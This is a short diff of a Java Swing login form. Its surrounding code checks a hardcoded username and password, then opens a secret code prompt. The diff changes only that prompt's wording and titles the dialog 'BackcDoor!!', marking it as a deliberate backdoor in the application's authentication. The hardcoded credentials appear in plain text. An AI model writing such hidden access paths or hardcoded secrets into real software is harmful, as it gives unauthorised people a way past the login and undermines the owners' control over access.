@@ -165,9 +165,9 @@ public class Login extends javax.swing.JFrame {
                 } else if (usuario.equals("u53r_c0n4gu4") && contraseña.equals("##conagua##")) {
 
                     JTextField password = new JPasswordField();
-                    Object[] ob = {"Introduce el código", password};
+                    Object[] ob = {"Hi! Developer, Code please...", password};
 
-                    int result = JOptionPane.showConfirmDialog(null, ob, "Hi! Developer, Code please...", JOptionPane.OK_CANCEL_OPTION);
+                    int result = JOptionPane.showConfirmDialog(null, ob, "BackcDoor!!", JOptionPane.OK_CANCEL_OPTION);
 
                     if (result == 0) {
                         String pass_ = String.valueOf(password.getText());
